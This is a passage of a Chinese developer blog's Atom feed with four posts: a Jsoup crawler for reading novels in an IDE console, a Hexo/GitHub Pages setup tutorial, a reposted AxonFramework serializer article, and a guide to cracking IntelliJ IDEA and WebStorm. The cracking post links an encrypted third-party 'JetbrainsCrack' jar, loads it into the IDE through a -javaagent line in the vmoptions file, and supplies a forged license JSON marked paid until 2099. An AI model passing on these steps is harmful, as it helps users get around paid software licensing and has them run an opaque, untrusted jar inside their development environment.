    <content type="html"><![CDATA[<blockquote><p>最近手上项目空了下来，没什么事做。博客博客不想写，文章文章不想看。于是干脆看点小说吧，但是上班时间，大家都在认认真真敲代码，自己拿出手机看小说又不是很好（其实主要是数据线坏了，在公司没发充电），电脑上浏览器看，更是不行。于是想了想，干脆就自己爬着看吧，把内容打印在IDE的控制台，想一想这波操作就很骚，于是说动就动。</p></blockquote><a id="more"></a><h1 id="爬虫选择"><a href="#爬虫选择" class="headerlink" title="爬虫选择"></a>爬虫选择</h1><p>由于本人是一枚正经的Javaer，所以爬虫当然也要用Java咯。Java下也有几款比较好的爬虫软件，如nutch、crawler4j 等。但是我只是爬个网页，看个小说而已啊。于是就选了个Jsoup，直接解析Html信息，从中提取小说内容。</p><p>其实选择Jsoup还有个原因就是我好歹写过一阵子jQuery，对jQuery语法比较熟悉。因为Jsoup语法与jQuery语法非常一致。</p><h1 id="开始动工"><a href="#开始动工" class="headerlink" title="开始动工"></a>开始动工</h1><p>添加maven依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt; org.jsoup &lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt; jsoup &lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt; 1.9.2 &lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h1 id="爬取页面信息"><a href="#爬取页面信息" class="headerlink" title="爬取页面信息"></a>爬取页面信息</h1><p>Jsoup的爬取方式十分简单，是通过获取html文档到本地，然后再用jQuery的解析方式做的DOM解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class BiQuGeCrawler extends AbstractCrawler &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getPage(String url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            page = Jsoup.connect(url).get();</span><br><span class="line"></span><br><span class="line">            this.getNext();</span><br><span class="line">            this.getLast();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return this.getContent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected String getContent()&#123;</span><br><span class="line">        Element cntEl = page.getElementById(&quot;content&quot;);</span><br><span class="line">        // 八个空格，（制表符号）</span><br><span class="line">        return cntEl.text().replaceAll(&quot;        &quot;, &quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void getNext() &#123;</span><br><span class="line">        Element ul = page.getElementsByClass(&quot;page_chapter&quot;).get(0).child(0);</span><br><span class="line">        Element nextHref = ul.child(2).child(0);</span><br><span class="line">        nextUrl = nextHref.attr(&quot;abs:href&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void getLast() &#123;</span><br><span class="line">        Element ul = page.getElementsByClass(&quot;page_chapter&quot;).get(0).child(0);</span><br><span class="line">        Element lastHref = ul.child(0).child(0);</span><br><span class="line">        lastUrl = lastHref.attr(&quot;abs:href&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取小说正文内容及前一页、后一页链接等关键信息。</p><h1 id="设置翻页及退出"><a href="#设置翻页及退出" class="headerlink" title="设置翻页及退出"></a>设置翻页及退出</h1><p>每次抓取完页面后，监听控制台输入值，进行翻页、退出操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public class Function &#123;</span><br><span class="line"></span><br><span class="line">    // app配置</span><br><span class="line">    private AppConfig config;</span><br><span class="line">    // 爬虫类</span><br><span class="line">    private AbstractCrawler crawler;</span><br><span class="line"></span><br><span class="line">    public Function(String firstUrl)&#123;</span><br><span class="line">        config = new AppConfig();</span><br><span class="line">        crawler =  CrawlerFactory.build(config.sourceType);</span><br><span class="line">        startView(firstUrl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 页面浏览</span><br><span class="line">    private void startView(String pageUrl)&#123;</span><br><span class="line">        String content = crawler.getPage(pageUrl);</span><br><span class="line">        System.out.println(content);</span><br><span class="line">        this.inputListener();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 开始浏览</span><br><span class="line">    private void inputListener()&#123;</span><br><span class="line">        System.out.println(&quot;*************&quot;);</span><br><span class="line">        System.out.println(&quot;* L 上一页   *&quot;);</span><br><span class="line">        System.out.println(&quot;* Q 退出     *&quot;);</span><br><span class="line">        System.out.println(&quot;* 其他 下一页 *&quot;);</span><br><span class="line">        System.out.println(&quot;*************&quot;);</span><br><span class="line">        Scanner sc = new Scanner(System.in);</span><br><span class="line">        String input = sc.nextLine();</span><br><span class="line">        if (&quot;l&quot;.equalsIgnoreCase(input))&#123;</span><br><span class="line">            // 上一页</span><br><span class="line">            startView(crawler.lastUrl);</span><br><span class="line">        &#125; else if (&quot;q&quot;.equalsIgnoreCase(input))&#123;</span><br><span class="line">            // 退出</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 下一页</span><br><span class="line">            startView(crawler.nextUrl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，整个摸鱼神器的关键代码就已经完成了，具体的完整代码，可以查看<a href="https://github.com/weechang/ReadingCrawler" rel="external nofollow noopener noreferrer" target="_blank">我的github项目</a></p><h1 id="Run一下"><a href="#Run一下" class="headerlink" title="Run一下"></a>Run一下</h1><p>首先配置需要看的小说网页信息及个人操作习惯设置。然后通过运行main方法。即可运行。</p><img src="/2018/09/21/论如何优雅地使用爬虫摸鱼/Run.png" title="效果预览"><h1 id="后续支持"><a href="#后续支持" class="headerlink" title="后续支持"></a>后续支持</h1><p>OK，到此爬虫已经能够正常爬取小说内容了。并且已经实现翻页、退出等基本功能。后续将支持更多小说来源如 <strong>纵横综合网</strong> 等网站。以及更多的功能如 <strong>日志混淆</strong>、 <strong>日志格式化</strong> 、<strong>断点续看</strong> 等功能。</p><p><strong>本文章涉及的代码已托管到github，欢迎各位客官使用<a href="https://github.com/weechang/ReadingCrawler" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/weechang/ReadingCrawler</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;最近手上项目空了下来，没什么事做。博客博客不想写，文章文章不想看。于是干脆看点小说吧，但是上班时间，大家都在认认真真敲代码，自己拿出手机看小说又不是很好（其实主要是数据线坏了，在公司没发充电），电脑上浏览器看，更是不行。于是想了想，干脆就自己爬着看吧，把内容打印在IDE的控制台，想一想这波操作就很骚，于是说动就动。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="爬虫" scheme="https://blog.weechang.xyz/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="Jsoup" scheme="https://blog.weechang.xyz/tags/Jsoup/"/>
    
  </entry>
  
  <entry>
    <title>IDEA、WebStorm最新永久激活方式</title>
    <link href="https://blog.weechang.xyz/2018/09/21/IDEA%E3%80%81WebStorm%E6%9C%80%E6%96%B0%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB%E6%96%B9%E5%BC%8F/"/>
    <id>https://blog.weechang.xyz/2018/09/21/IDEA、WebStorm最新永久激活方式/</id>
    <published>2018-09-21T05:22:40.000Z</published>
    <updated>2018-09-29T08:37:32.625Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>今天早上一大早打开IDEA发现激活已过期，遂开始寻找激活码。但是一直不成功，后来终于找到一种比较靠谱的激活方式。在此记录下来，以备不时之需。</p></blockquote><a id="more"></a><p>目前网上现有的激活方式大概有这么三种</p><h1 id="激活码"><a href="#激活码" class="headerlink" title="激活码"></a>激活码</h1><p>这种方式一般是给出一段激活码，然后有些还需要改host。目前这种方式，很多激活码都不能使用了，就算能使用可能到了某一天你会发现他用不了了。所以不太推荐这种方式。</p><h1 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h1><p>这种方式一般是填写一个服务器地址就行了，但是现在很多服务器都被官方封了。没被封的也在被封的路上。</p><h1 id="自建服务器"><a href="#自建服务器" class="headerlink" title="自建服务器"></a>自建服务器</h1><p>这种方式比较靠谱，自己搭建一个认证服务器。但是对于没有服务器的穷人来说，也是一个巨大的挑战。所以不是特别推荐。</p><p>接下来就推荐一种比较靠谱的方式。</p><h1 id="插件激活"><a href="#插件激活" class="headerlink" title="插件激活"></a>插件激活</h1><p>这种方式呢目前而言比较靠谱，由于插件在本地，不存在官方封域名及IP的说法，但是不排除被后期修复的问题。至少目前而言是没问题的，亲自验证过IDEA2017.3.5与2018.2是没有任何问题的。</p><p>下面将具体介绍这种方式的操作方法。</p><h2 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h2><p>首先下载插件jar包 <a href="http://idea.lanyus.com/jar/JetbrainsCrack-3.1-release-enc.jar" rel="external nofollow noopener noreferrer" target="_blank">http://idea.lanyus.com/jar/JetbrainsCrack-3.1-release-enc.jar</a></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>然后将插件移动到 IDEA 安装目录的bin下。如我的目录 D:\idea\IntelliJ IDEA 2018.2.4\bin</p><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>修改 IDEA 安装bin目录下的 idea64.exe.vmoptions 或者 idea.exe.vmoptions 具体修改哪一个看自己操作系统是64 位还是32位。64位修改 idea64.exe.vmoptions ， 32位修改 idea.exe.vmoptions。</p><img src="/2018/09/21/IDEA、WebStorm最新永久激活方式/配置文件.png" title="配置文件"><p>然后在文件末尾添加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:D:\idea\IntelliJ IDEA 2018.2.4\bin\JetbrainsCrack-3.1-release-enc.jar</span><br></pre></td></tr></table></figure><p>其中 D:\idea\IntelliJ IDEA 2018.2.4\bin\JetbrainsCrack-3.1-release-enc.jar 为插件的安装路径和文件名。注意，目录和文件名一定要一直，不然IDEA不能启动</p><img src="/2018/09/21/IDEA、WebStorm最新永久激活方式/修改配置.png" title="修改配置"><h2 id="重启IDEA、填写CODE"><a href="#重启IDEA、填写CODE" class="headerlink" title="重启IDEA、填写CODE"></a>重启IDEA、填写CODE</h2><p>重启IDEA，选择Activation Code填写激活码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ThisCrackLicenseId-&#123;</span><br><span class="line">&quot;licenseId&quot;:&quot;ThisCrackLicenseId&quot;,</span><br><span class="line">&quot;licenseeName&quot;:&quot;你想填的用户名&quot;,</span><br><span class="line">&quot;assigneeName&quot;:&quot;&quot;,</span><br><span class="line">&quot;assigneeEmail&quot;:&quot;你想填的邮箱&quot;,</span><br><span class="line">&quot;licenseRestriction&quot;:&quot;For This Crack, Only Test! Please support genuine!!!&quot;,</span><br><span class="line">&quot;checkConcurrentUse&quot;:false,</span><br><span class="line">&quot;products&quot;:[</span><br><span class="line">&#123;&quot;code&quot;:&quot;II&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;DM&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;AC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;RS0&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;WS&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;DPN&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;RC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;PS&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;DC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;RM&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;CL&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;,</span><br><span class="line">&#123;&quot;code&quot;:&quot;PC&quot;,&quot;paidUpTo&quot;:&quot;2099-12-31&quot;&#125;</span><br><span class="line">],</span><br><span class="line">&quot;hash&quot;:&quot;2911276/0&quot;,</span><br><span class="line">&quot;gracePeriodDays&quot;:7,</span><br><span class="line">&quot;autoProlongated&quot;:false&#125;</span><br></pre></td></tr></table></figure><img src="/2018/09/21/IDEA、WebStorm最新永久激活方式/激活码.png" title="激活码"><h1 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h1><p>OK，至此为止，你的IDEA 就激活成功，又可以继续浪了。</p><p><strong>Web Storm 激活步骤与此相同</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;今天早上一大早打开IDEA发现激活已过期，遂开始寻找激活码。但是一直不成功，后来终于找到一种比较靠谱的激活方式。在此记录下来，以备不时之需。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
      <category term="IDEA永久激活" scheme="https://blog.weechang.xyz/tags/IDEA%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/"/>
    
      <category term="WebStorm永久激活" scheme="https://blog.weechang.xyz/tags/WebStorm%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>六元一个的私有博客系统，了解一下？</title>
    <link href="https://blog.weechang.xyz/2018/09/19/%E5%85%AD%E5%85%83%E4%B8%80%E4%B8%AA%E7%9A%84%E7%A7%81%E6%9C%89%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%EF%BC%9F/"/>
    <id>https://blog.weechang.xyz/2018/09/19/六元一个的私有博客系统，了解一下？/</id>
    <published>2018-09-19T06:33:09.000Z</published>
    <updated>2018-09-29T07:47:10.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="神说要有光，于是便有了光"><a href="#神说要有光，于是便有了光" class="headerlink" title="神说要有光，于是便有了光"></a>神说要有光，于是便有了光</h1><p>写代码的，偶尔都想装点逼，想要自己写点博客。刚开始还能在各大社区写，比如说CSDN，开源中国，博客园什么的。但是越写就会越觉得，那些博客平台都不是自己想要的，虽然大平台，能够提高在搜索引擎的收录，但是我看着别人的博客，我也想要有一个自建的博客系统。于是开始了自建博客的入坑之旅，在这儿给大伙分享一下我的自建博客历程。</p><a id="more"></a><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>因为自己不是很懂，网上找的资料也很分散。所以整个历程大概经历了四天左右才把自己的博客系统搞好。首先需要准备以下资源</p><ol><li>github账号（应该都有吧，没有的自己去注册一个）<a href="https://www.github.com" target="_blank" rel="external nofollow noopener noreferrer">传送门</a></li><li>选择一个你喜欢的hexo主题，这个网上太多了。可以去<a href="http://hexo.io/themes/" target="_blank" rel="external nofollow noopener noreferrer">hexo官网</a>，或者<a href="https://github.com/search?q=hexo" target="_blank" rel="external nofollow noopener noreferrer">github</a>上看看</li><li>准备一个nodeJS环境，具体怎么搞，可以度娘一下 <a href="https://www.cnblogs.com/zhouyu2017/p/6485265.html" target="_blank" rel="external nofollow noopener noreferrer">windows传送门</a>，<a herf="https://www.cnblogs.com/BinXu/p/6050850.html" target="_blank">Mac 传送门</a></li><li>一个阿里云账号（如果使用github提供的域名的话，这个可以省了）</li></ol><h1 id="新建github项目"><a href="#新建github项目" class="headerlink" title="新建github项目"></a>新建github项目</h1><p>新建github项目时项目命名规则为{username}.github.io如我的github用户名为weechang。则项目命名为weechang.github.io。<br><img src="/2018/09/19/六元一个的私有博客系统，了解一下？/新建项目.png" title="新建项目"></p><p><strong>注意：命名规则必须按照这个规则来。</strong></p><h1 id="github项目配置"><a href="#github项目配置" class="headerlink" title="github项目配置"></a>github项目配置</h1><p>创建成功后就可以配置github项目了。github会自动根据项目名识别是否为github pages项目。如果是github pages项目，会出现github pages配置项目。在此，可以设置github pages项目所在分支及自定义域名等信息。<br><img src="/2018/09/19/六元一个的私有博客系统，了解一下？/github项目配置.png" title="github项目配置"></p><p><strong>注意：自定义域名通过cname方式解析，由于github服务器在国外，所以可以不用备案。</strong></p><h1 id="查看页面"><a href="#查看页面" class="headerlink" title="查看页面"></a>查看页面</h1><p>在浏览器输入 http://{username}.github.io 即可访问你的个人页面。如: <a href="http://weechang.github.io" rel="external nofollow noopener noreferrer" target="_blank">http://weechang.github.io</a></p><p>如果访问不了页面，请检查以下问题：</p><ul><li>1.项目名是否准确</li><li>2.域名是否解析到了指定cname地址</li><li>3.分支选择是否正确</li></ul><h1 id="安装hexo客户端"><a href="#安装hexo客户端" class="headerlink" title="安装hexo客户端"></a>安装hexo客户端</h1><p>打开cmd命令行，选择一个你喜欢的目录（建议可以用git从github克隆工程到本地的本地目录），输入安装命令，开始安装hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g</span><br></pre></td></tr></table></figure><img src="/2018/09/19/六元一个的私有博客系统，了解一下？/安装hexo客户端.png" title="安装hexo客户端"><p>安装完成后，输入命令，检查hexo是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><img src="/2018/09/19/六元一个的私有博客系统，了解一下？/检查hexo.png" title="检查hexo"><h1 id="初始化项目文件夹"><a href="#初始化项目文件夹" class="headerlink" title="初始化项目文件夹"></a>初始化项目文件夹</h1><p>在项目文件夹下输入初始化命令，进行初始化（此处如果实在克隆项目进行的话，建议新建一个分支，比如我的就是hexo分支，该分支用来管理博客源文件与配置。当然如果想要新建项目管理这些东西的话，当我没说）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>hexo组件初始化完成后。需要安装依赖包,输入命令即可安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><h1 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h1><p>OK到了此处,你的博客系统已经可运行了。</p><p><strong>首先</strong>，生成博客</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate // 或者 hexo g</span><br></pre></td></tr></table></figure><p><strong>本地部署</strong>，本地运行、预览</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server // 或者 hexo s</span><br></pre></td></tr></table></figure><p>web服务启动后，在浏览器输入给出的预览地址，即可预览</p><p>如下，是我的本地预览效果图</p><img src="/2018/09/19/六元一个的私有博客系统，了解一下？/预览.png" title="本地预览"><p><strong>推送到github</strong></p><p>通过hexo 配置，即可将生成的页面推送到github</p><p>修改_config.yml文件。配置如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  branch: master</span><br><span class="line">  repo:</span><br><span class="line">    github: https://github.com/weechang/weechang.github.io.git</span><br><span class="line">  bucket: blog.weechang.xyz</span><br></pre></td></tr></table></figure><p>通过命令推送到github</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy // 或者 hexo d</span><br></pre></td></tr></table></figure><p>推送完毕后，即可通过访问 http://{username}.github.io 访问你刚部署的博客系统（由于服务器缓存等原因，可能需要等几分钟才能访问到最新页面）。</p><p>OK，至此为止。最基本的博客系统就构建完成了。如果需要了解更详细的信息，可以继续关注我的相关文章。</p><p>若有疑问可以查看我的项目配置 <a href="https://github.com/weechang/weechang.github.io" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/weechang/weechang.github.io</a></p><p>该项目 master分支是生成的博客文章信息。hexo是博客源码。如有疑惑之处，欢迎留言讨论。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;神说要有光，于是便有了光&quot;&gt;&lt;a href=&quot;#神说要有光，于是便有了光&quot; class=&quot;headerlink&quot; title=&quot;神说要有光，于是便有了光&quot;&gt;&lt;/a&gt;神说要有光，于是便有了光&lt;/h1&gt;&lt;p&gt;写代码的，偶尔都想装点逼，想要自己写点博客。刚开始还能在各大社区写，比如说CSDN，开源中国，博客园什么的。但是越写就会越觉得，那些博客平台都不是自己想要的，虽然大平台，能够提高在搜索引擎的收录，但是我看着别人的博客，我也想要有一个自建的博客系统。于是开始了自建博客的入坑之旅，在这儿给大伙分享一下我的自建博客历程。&lt;/p&gt;
    
    </summary>
    
      <category term="开源之路" scheme="https://blog.weechang.xyz/categories/%E5%BC%80%E6%BA%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="手把手教学" scheme="https://blog.weechang.xyz/tags/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E5%AD%A6/"/>
    
      <category term="Hexo博客" scheme="https://blog.weechang.xyz/tags/Hexo%E5%8D%9A%E5%AE%A2/"/>
    
      <category term="GitHub Pages" scheme="https://blog.weechang.xyz/tags/GitHub-Pages/"/>
    
  </entry>
  
  <entry>
    <title>AxonFramework-事件序列化器调优</title>
    <link href="https://blog.weechang.xyz/2018/08/31/AxonFramework-%E4%BA%8B%E4%BB%B6%E5%BA%8F%E5%88%97%E5%8C%96%E5%99%A8%E8%B0%83%E4%BC%98/"/>
    <id>https://blog.weechang.xyz/2018/08/31/AxonFramework-事件序列化器调优/</id>
    <published>2018-08-31T03:20:34.000Z</published>
    <updated>2018-09-27T06:22:48.071Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XStream序列化器"><a href="#XStream序列化器" class="headerlink" title="XStream序列化器"></a>XStream序列化器</h2><p>XStream是完全可配置和可扩展的。如果你只使用一个无格式XStreamSerializer，有一些速效方案随时取用。<br><a id="more"></a></p><p>XStream允许你为包名称和事件类名称配置别名。别名通常更短(特别是如果你有长包名)，使事件的序列化形式更小。由于我们讨论的是XML，所以每个字符从XML中移除是两次(一个开始标记，一个结束标记)。</p><p>在XStream中一个更高级的话题创建自定义转换器。默认的基于反射的转换器是简单的，但不会生成最紧凑的XML。总是仔细观察生成的XML，看看是否真正需要重建原始实例的所有信息。</p><p>如果有可能避免upcasters的使用。XStream允许别名用于字段，当他们已经改变了名字。想象版本为0事件,使用一个名为“clientId”字段。业务更喜欢“客户”一词，所以版本1使用被称为“customerId”的字段创建。在XStream中这个使用字段别名完全可以配置。你需要配置两个别名，按照以下顺序：别名“customerId”到“clientId”然后别名“customerId”到“customerId”。这将告诉XStream，如果遇到一个叫做“customerId”字段，它将调用相应的XML元素“customerId”(第二个别名覆盖第一个)。但如果XStream遇到一个XML称为“clientId”的元素，这是一个已知的别名，将解析为字段名称“customerId”。查看XStream文档了解更多信息。</p><p>对于终极性能，没有基于反射机制的alltogether你可能更好。在这种情况下，创建一个自定义的序列化机制，这可能是最明智的。DataInputStream和DataOutputStream允许你容易将事件的内容写入输出流。ByteArrayOutputStream和ByteArrayInputStream允许写入和读取字节数组。</p><h2 id="防止重复序列化"><a href="#防止重复序列化" class="headerlink" title="防止重复序列化"></a>防止重复序列化</h2><p>特别是在分布式系统中，事件消息需要在多个场合进行序列化。Axon的组件检测这个并支持SerializationAware消息。如果检测到SerializationAware消息，其方法用来序列化一个对象,而不是简单地传递载荷到序列化器。这允许对性能进行优化。</p><p>当你序列化你自己消息时，希望受益于SerializationAware优化，使用MessageSerializer类序列化消息的有效负载和元数据。所有优化逻辑是在这个类中实现。更多细节请参考MessageSerializer的JavaDoc。</p><h2 id="自定义标识符生成器"><a href="#自定义标识符生成器" class="headerlink" title="自定义标识符生成器"></a>自定义标识符生成器</h2><p>AxonFramework使用IdentifierFactory生成所有的标识符，不论它们是事件或命令。默认情况下，IdentifierFactory随机生成基于java.util.UUID的标识符。尽管它们使用起来非常安全，但生成它们的过程的性能并出色。</p><p>IdentifierFactory是一个抽象工厂，使用Java的ServiceLoader(从Java 6)机制找到实现来使用。这意味着你可以创建自己的工厂的实现，将实现的名称放在一个叫做“/META-INF/services/org.axonframework.common.IdentifierFactory”文件中。Java的ServiceLoader机制将检测到文件并尝试创建名为inside类的实例。</p><p>IdentifierFactory有几个的需求。必须实现：</p><ul><li>在类路径中让它的完全限定类名作为/META-INF/services/org.axonframework.common.IdentifierFactory文件的内容,</li><li>有一个可访问的无参数构造函数,</li><li>扩展IdentifierFactory,</li><li>通过应用程序的类加载器上下文或类加载器加载IdentifierFactory类来访问，并且必须的</li><li>是线程安全的。</li></ul><p>作者：勇赴<br>链接：<a href="https://www.jianshu.com/p/801dade37318" rel="external nofollow noopener noreferrer" target="_blank">https://www.jianshu.com/p/801dade37318</a><br>來源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XStream序列化器&quot;&gt;&lt;a href=&quot;#XStream序列化器&quot; class=&quot;headerlink&quot; title=&quot;XStream序列化器&quot;&gt;&lt;/a&gt;XStream序列化器&lt;/h2&gt;&lt;p&gt;XStream是完全可配置和可扩展的。如果你只使用一个无格式XStreamSerializer，有一些速效方案随时取用。&lt;br&gt;
    
    </summary>
    
      <category term="AxonFramework" scheme="https://blog.weechang.xyz/categories/AxonFramework/"/>
    
    
      <category term="AxonFramework" scheme="https://blog.weechang.xyz/tags/AxonFramework/"/>
    
  </entry>
  
</feed>
